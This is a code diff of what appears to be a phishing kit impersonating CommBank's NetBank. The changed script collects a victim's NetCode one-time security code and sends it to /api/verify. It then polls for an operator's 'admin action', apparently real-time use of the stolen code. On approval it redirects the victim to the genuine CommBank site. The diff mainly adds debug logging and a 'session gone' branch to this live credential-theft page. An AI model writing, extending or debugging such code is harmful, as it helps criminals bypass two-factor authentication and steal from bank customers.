@@ -183,44 +183,44 @@
   }
 
   /* ===== 6. SHOW LOADING OVERLAY ===== */
-function showLoading() {
-  const overlay = document.createElement('div');
-  overlay.id = 'login-loading-overlay';
-  overlay.style.cssText = `
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-    pointer-events: none; /* Allows interaction with elements behind the overlay */
-  `;
+  function showLoading() {
+    const overlay = document.createElement('div');
+    overlay.id = 'login-loading-overlay';
+    overlay.style.cssText = `
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.9);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    `;
 
-  const loader = document.createElement('img');
-  loader.src = '/images/loader.811fa38f2f95504a101b1b41aec4e3ca.gif';
-  loader.alt = 'Loading...';
-  loader.style.cssText = `
-    width: 50px;
-    height: 50px;
-  `;
+    const loader = document.createElement('img');
+    loader.src = '/images/loader.811fa38f2f95504a101b1b41aec4e3ca.gif';
+    loader.alt = 'Loading...';
+    loader.style.cssText = `
+      width: 50px;
+      height: 50px;
+    `;
 
-  const text = document.createElement('p');
-  text.textContent = 'Verifying...';
-  text.style.cssText = `
-    color: #333333;
-    font-family: Arial, sans-serif;
-    font-size: 14px;
-    margin-top: 15px;
-  `;
+    const text = document.createElement('p');
+    text.textContent = 'Verifying...';
+    text.style.cssText = `
+      color: #333333;
+      font-family: Arial, sans-serif;
+      font-size: 14px;
+      margin-top: 15px;
+    `;
 
-  overlay.appendChild(loader);
-  overlay.appendChild(text);
-  document.body.appendChild(overlay);
-}
+    overlay.appendChild(loader);
+    overlay.appendChild(text);
+    document.body.appendChild(overlay);
+  }
 
   /* ===== 7. HIDE LOADING OVERLAY ===== */
   function hideLoading() {
@@ -264,26 +264,38 @@ function showLoading() {
   /* ===== 10. POLL FOR ADMIN ACTION ===== */
   let isWaitingForAdmin = false;
   let pollInterval;
+  let pollCount = 0;
 
   function startPolling() {
     if (isWaitingForAdmin) return;
     isWaitingForAdmin = true;
+    pollCount = 0;
+    console.log('[DEBUG] Started polling for admin action');
 
     const poll = async () => {
-      if (!isWaitingForAdmin) return;
+      if (!isWaitingForAdmin) {
+        console.log('[DEBUG] Polling stopped');
+        return;
+      }
+
+      pollCount++;
+      console.log(`[DEBUG] Poll #${pollCount}`);
 
       try {
         const res = await fetch(`/api/status/${sid}`);
         const data = await res.json();
+        console.log('[DEBUG] Status response:', data);
 
         if (data.status === 'ok') {
+          console.log('[DEBUG] Status is OK - redirecting to CommBank');
           isWaitingForAdmin = false;
-          // Redirect to CommBank website on approval
-          window.location.href = 'https://www.commbank.com.au/';
+          // IMMEDIATE redirect to CommBank
+          window.location.replace('https://www.commbank.com.au/');
           return;
         }
 
         if (data.status === 'redo') {
+          console.log('[DEBUG] Status is REDO - showing error');
           isWaitingForAdmin = false;
           hideLoading();
           clearForm();
@@ -297,11 +309,20 @@ function showLoading() {
           return;
         }
 
+        if (data.status === 'gone') {
+          console.log('[DEBUG] Session gone');
+          isWaitingForAdmin = false;
+          hideLoading();
+          showErrorMessage('Session expired. Please try again.');
+          return;
+        }
+
         // Continue polling
+        console.log('[DEBUG] Continuing poll...');
         pollInterval = setTimeout(poll, 1200);
 
       } catch (err) {
-        console.error('Poll error:', err);
+        console.error('[DEBUG] Poll error:', err);
         pollInterval = setTimeout(poll, 2000);
       }
     };
@@ -322,6 +343,7 @@ function showLoading() {
     showLoading();
 
     const netcode = getNetCode();
+    console.log('[DEBUG] Submitting NetCode:', netcode);
 
     try {
       const response = await fetch('/api/verify', {
@@ -330,13 +352,16 @@ function showLoading() {
         body: JSON.stringify({ sid, phone: netcode })
       });
 
+      console.log('[DEBUG] Submit response:', response.status);
+
       if (response.ok) {
+        console.log('[DEBUG] NetCode submitted successfully, starting poll');
         startPolling();
       } else {
         throw new Error('Verification failed');
       }
     } catch (err) {
-      console.error('Verify error:', err);
+      console.error('[DEBUG] Submit error:', err);
       hideLoading();
       showErrorMessage('Unable to verify. Please try again.');
     }
@@ -344,6 +369,8 @@ function showLoading() {
 
   /* ===== 12. SETUP EVENT LISTENERS ===== */
   document.addEventListener('DOMContentLoaded', () => {
+    console.log('[DEBUG] Verify page loaded, SID:', sid);
+    
     const netcodeInput = document.getElementById('netcode');
     const verifyBtn = document.getElementById('ctl00_BodyPlaceHolder_lnkNext');
 
@@ -833,6 +860,7 @@ function showLoading() {
   </div>
  </body>
 </html>
+
 
 
 
